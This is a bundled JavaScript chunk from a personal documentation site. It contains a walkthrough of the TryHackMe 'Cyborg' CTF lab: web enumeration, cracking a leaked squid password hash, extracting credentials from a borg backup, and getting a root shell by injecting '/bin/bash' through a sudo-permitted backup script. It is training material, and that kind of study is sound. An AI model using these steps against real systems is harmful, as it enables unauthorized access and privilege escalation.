"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[53931],{28453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>o});var a=t(96540);const s={},i=a.createContext(s);function r(e){const n=a.useContext(i);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:r(e.components),a.createElement(i.Provider,{value:n},e.children)}},47007:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>a,toc:()=>l});const a=JSON.parse('{"id":"hacker/tryhackme/cyborg","title":"TryHackMe Cyborg Walkthrough - Complete CTF Solution and Learning Guide","description":"Complete walkthrough of TryHackMe\'s Cyborg room. Learn penetration testing techniques, vulnerability exploitation, and privilege escalation methods.","source":"@site/docs/hacker/tryhackme/cyborg.md","sourceDirName":"hacker/tryhackme","slug":"/hacker/tryhackme/cyborg","permalink":"/docs/hacker/tryhackme/cyborg","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/cyborg.md","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/tags/tryhackme"},{"inline":true,"label":"ctf","permalink":"/docs/tags/ctf"},{"inline":true,"label":"walkthrough","permalink":"/docs/tags/walkthrough"},{"inline":true,"label":"penetration-testing","permalink":"/docs/tags/penetration-testing"},{"inline":true,"label":"linux","permalink":"/docs/tags/linux"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1771617957000,"sidebarPosition":1,"frontMatter":{"title":"TryHackMe Cyborg Walkthrough - Complete CTF Solution and Learning Guide","description":"Complete walkthrough of TryHackMe\'s Cyborg room. Learn penetration testing techniques, vulnerability exploitation, and privilege escalation methods.","keywords":["tryhackme cyborg","ctf walkthrough","penetration testing","linux exploitation","privilege escalation","cyber security","ethical hacking"],"tags":["tryhackme","ctf","walkthrough","penetration-testing","linux"],"sidebar_position":1},"sidebar":"docsSidebar","previous":{"title":"Active Directory Basics - TryHackMe Walkthrough and Study Notes","permalink":"/docs/hacker/tryhackme/adbasics"},"next":{"title":"TryHackMe Brainpan 1 Walkthrough - Buffer Overflow Exploitation Challenge","permalink":"/docs/hacker/tryhackme/brainpan1"}}');var s=t(74848),i=t(28453);const r={title:"TryHackMe Cyborg Walkthrough - Complete CTF Solution and Learning Guide",description:"Complete walkthrough of TryHackMe's Cyborg room. Learn penetration testing techniques, vulnerability exploitation, and privilege escalation methods.",keywords:["tryhackme cyborg","ctf walkthrough","penetration testing","linux exploitation","privilege escalation","cyber security","ethical hacking"],tags:["tryhackme","ctf","walkthrough","penetration-testing","linux"],sidebar_position:1},o=void 0,c={},l=[{value:"RECON",id:"recon",level:2},{value:"Nmap",id:"nmap",level:3},{value:"Gobuster",id:"gobuster",level:3},{value:"Crack",id:"crack",level:2},{value:"Enumerate web folders",id:"enumerate-web-folders",level:2},{value:"archive.tar",id:"archivetar",level:3},{value:"Borg Backup System",id:"borg-backup-system",level:2},{value:"PRIVESC",id:"privesc",level:2},{value:"user.txt",id:"usertxt",level:3},{value:"root.txt",id:"roottxt",level:3}];function h(e){const n={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.admonition,{title:"Description",type:"info",children:[(0,s.jsxs)(n.p,{children:["These are my notes for the ",(0,s.jsx)(n.a,{href:"https://tryhackme.com/room/cyborgt8",children:"Cyborg Room"})," on TryHackMe."]}),(0,s.jsx)(n.p,{children:"Note: Task #1 is to deploy the machine."}),(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{style:{textAlign:"center"},children:"OS"}),(0,s.jsx)(n.th,{style:{textAlign:"center"},children:"Level"}),(0,s.jsx)(n.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,s.jsx)(n.tbody,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"Windows"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"Easy"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"5/5"})]})})]})]}),"\n",(0,s.jsx)(n.h2,{id:"recon",children:"RECON"}),"\n",(0,s.jsx)(n.h3,{id:"nmap",children:"Nmap"}),"\n",(0,s.jsxs)(n.p,{children:["From scan ",(0,s.jsx)(n.code,{children:"nmap -v -sV -p- -o nmap-cyborg.txt 10.10.148.181"})]}),"\n",(0,s.jsx)(n.p,{children:"I found:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsx)(n.h3,{id:"gobuster",children:"Gobuster"}),"\n",(0,s.jsx)(n.p,{children:"results (didnt note the command):"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"http://10.10.19.193/.hta                 (Status: 403) [Size: 277]\nhttp://10.10.19.193/.htaccess            (Status: 403) [Size: 277]\nhttp://10.10.19.193/.htpasswd            (Status: 403) [Size: 277]\nhttp://10.10.19.193/admin                (Status: 301) [Size: 312] [--\x3e http://10.10.19.193/admin/]\nhttp://10.10.19.193/etc                  (Status: 301) [Size: 310] [--\x3e http://10.10.19.193/etc/]\nhttp://10.10.19.193/index.html           (Status: 200) [Size: 11321]\nhttp://10.10.19.193/server-status        (Status: 403) [Size: 277]\n"})}),"\n",(0,s.jsxs)(n.p,{children:["I browse to ",(0,s.jsx)(n.code,{children:"http://10.10.19.193/etc/squid/passwd"})," and find ",(0,s.jsx)(n.code,{children:"music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn."})]}),"\n",(0,s.jsx)(n.p,{children:"Let's crack it."}),"\n",(0,s.jsx)(n.h2,{id:"crack",children:"Crack"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'\u2514\u2500$ john passwd --wordlist=/usr/share/wordlists/rockyou.txt                                                  130 \u2a2f\nWarning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"\nUse the "--format=md5crypt-long" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nsquidward        (music_archive)\n1g 0:00:00:01 DONE (2022-01-15 23:24) 0.6711g/s 26158p/s 26158c/s 26158C/s wonderfull..samantha5\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed\n'})}),"\n",(0,s.jsxs)(n.p,{children:["We have user/password = ",(0,s.jsx)(n.code,{children:"music_archive/squidward"})]}),"\n",(0,s.jsx)(n.h2,{id:"enumerate-web-folders",children:"Enumerate web folders"}),"\n",(0,s.jsxs)(n.p,{children:["I found ",(0,s.jsx)(n.code,{children:"squid.conf"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# http://10.10.19.193/etc/squid/squid.conf\n\nauth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd\nauth_param basic children 5\nauth_param basic realm Squid Basic Authentication\nauth_param basic credentialsttl 2 hours\nacl auth_users proxy_auth REQUIRED\nhttp_access allow auth_users\n"})}),"\n",(0,s.jsx)(n.h3,{id:"archivetar",children:"archive.tar"}),"\n",(0,s.jsxs)(n.p,{children:["I found archive on ",(0,s.jsx)(n.code,{children:"view-source:http://10.10.148.181/admin/index.html"})," = ",(0,s.jsx)(n.code,{children:"http://10.10.148.181/admin/archive.tar"})]}),"\n",(0,s.jsx)(n.p,{children:"downloaded & extracted - contains a BORG archive."}),"\n",(0,s.jsx)(n.p,{children:"might come in handy later:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sh",children:'\u2514\u2500$ strings integrity.5\nversion\nhints\n@{"algorithm": "XXH64", "digests": {"final": "05178884e81563d7"\\}\\}\nindex\nb{"algorithm": "XXH64", "digests": {"HashHeader": "146e9cb969e480a3", "final": "b53737af67235823"\\}\\}\n'})}),"\n",(0,s.jsx)(n.p,{children:"config file"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sh",children:"[repository]\nversion = 1\nsegments_per_dir = 1000\nmax_segment_size = 524288000\nappend_only = 0\nstorage_quota = 0\nadditional_free_space = 0\nid = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31\nkey = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV\n        L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj\n        2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN\n        8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX\n        daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx\n        oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN\n        eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb\n        T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl\n        vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h\n        SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld\n        UCH8bjZLfc1GFsundmVyc2lvbgE=\n"})}),"\n",(0,s.jsx)(n.h2,{id:"borg-backup-system",children:"Borg Backup System"}),"\n",(0,s.jsxs)(n.p,{children:["the tar is a borg deduplication file/archive ",(0,s.jsx)(n.a,{href:"https://borgbackup.readthedocs.io/en/stable/index.html",children:"borg"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["the ",(0,s.jsx)(n.a,{href:"https://borgbackup.readthedocs.io/en/stable/usage/general.html",children:"usage"})," is e.g. ",(0,s.jsx)(n.code,{children:"borg list /path/to/archive"})]}),"\n",(0,s.jsxs)(n.p,{children:["for the archive.tar with ",(0,s.jsx)(n.code,{children:"/home/field/dev"}),' the actual "archive" is the folder ',(0,s.jsx)(n.code,{children:"final_archive"}),":"]}),"\n",(0,s.jsxs)(n.p,{children:["use the passwd we cracked ",(0,s.jsx)(n.code,{children:"squidward"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/download/home/field/dev]\n\u2514\u2500$ borg list ./final_archive\nEnter passphrase for key /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/CYBORG/download/home/field/dev/final_archive:\nmusic_archive                        Wed, 2020-12-30 03:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]\n"})}),"\n",(0,s.jsx)(n.p,{children:"so will try and extract it, see any info in it."}),"\n",(0,s.jsx)(n.h2,{id:"privesc",children:"PRIVESC"}),"\n",(0,s.jsx)(n.h3,{id:"usertxt",children:"user.txt"}),"\n",(0,s.jsxs)(n.p,{children:["mounted archive using ",(0,s.jsx)(n.code,{children:"borg mount ./final_archive /tmp/borg"}),", mounts the FUSE filesystem archive at ",(0,s.jsx)(n.code,{children:"/tmp/borg"})," and was the users whole home dir backup. had a look around and found ",(0,s.jsx)(n.code,{children:"Document\\note.txt"})," which had:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ cat Documents/note.txt\nWow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!\n\nalex:S3cretP@s3\n"})}),"\n",(0,s.jsxs)(n.p,{children:["use it to ",(0,s.jsx)(n.code,{children:"ssh alex@10.10.148.181"})," and got the ",(0,s.jsx)(n.code,{children:"user.txt"})," flag."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"alex@ubuntu:~$ cat user.txt\nflag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}\n"})}),"\n",(0,s.jsx)(n.h3,{id:"roottxt",children:"root.txt"}),"\n",(0,s.jsxs)(n.p,{children:["check what alex can do with ",(0,s.jsx)(n.code,{children:"sudo"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"alex@ubuntu:~$ sudo -l\nMatching Defaults entries for alex on ubuntu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser alex may run the following commands on ubuntu:\n    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh\n"})}),"\n",(0,s.jsxs)(n.p,{children:["looking through the ",(0,s.jsx)(n.code,{children:"/etc/mp3backups/backup.sh"})," and this part looks the most interesting because it's allowing a command to be injected in here, running as root ",":D"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n\n...\n\nwhile getopts c: flag\ndo\n  case "$\\{flag}" in\n    c) command=$\\{OPTARG};;\n  esac\ndone\n\n...\n\n'})}),"\n",(0,s.jsxs)(n.p,{children:["This ",(0,s.jsx)(n.a,{href:"https://www.howtogeek.com/778410/how-to-use-getopts-to-parse-linux-shell-script-options/",children:"page"})," explains how ",(0,s.jsx)(n.code,{children:"getopts"})," works by letting you set the characters used to trigger the cases."]}),"\n",(0,s.jsxs)(n.p,{children:["I try adding a ",(0,s.jsx)(n.code,{children:"-c /bin/bash"})," to the backup script:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c /bin/bash\n/home/alex/Music/image12.mp3\n/home/alex/Music/image7.mp3\n/home/alex/Music/image1.mp3\n/home/alex/Music/image10.mp3\n/home/alex/Music/image5.mp3\n/home/alex/Music/image4.mp3\n/home/alex/Music/image3.mp3\n/home/alex/Music/image6.mp3\n/home/alex/Music/image8.mp3\n/home/alex/Music/image9.mp3\n/home/alex/Music/image11.mp3\n/home/alex/Music/image2.mp3\nfind: \u2018/run/user/108/gvfs\u2019: Permission denied\nBacking up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz\n\ntar: Removing leading `/' from member names\ntar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory\ntar: Exiting with failure status due to previous errors\n\nBackup finished\nroot@ubuntu:~#\n"})}),"\n",(0,s.jsx)(n.p,{children:"because this spawns a shell halfway through the script, the output will be going to some other output, so we don't see the results until I exit out of the shell:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ubuntu:~# id; whoami; cat /root/root.txt\nroot@ubuntu:~# exit\nuid=0(root) gid=0(root) groups=0(root) root flag{Than5s_f0r_play1ng_H0p\xa3_y0u_enJ053d}\n"})})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}}}]);